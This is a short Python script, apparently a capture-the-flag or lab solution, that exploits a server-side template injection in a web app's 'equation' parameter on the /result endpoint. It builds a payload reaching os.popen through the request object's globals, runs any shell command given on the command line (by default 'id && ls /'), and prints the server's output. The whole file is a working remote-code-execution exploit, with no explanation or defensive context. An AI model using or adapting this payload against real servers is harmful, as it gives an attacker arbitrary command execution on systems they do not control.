import requests


def run(host, command):
    payload = "request.application.__globals__.__builtins__.__import__('os').popen('"+command+"').read()"
    r = requests.get('http://'+host+'/result', params={'equation': payload})
    print(r.content.decode())
if __name__ == "__main__":
    from argparse import ArgumentParser

    parser = ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("--command", type=str, default='id && ls /')
    args = parser.parse_args()
    run(args.host, args.command)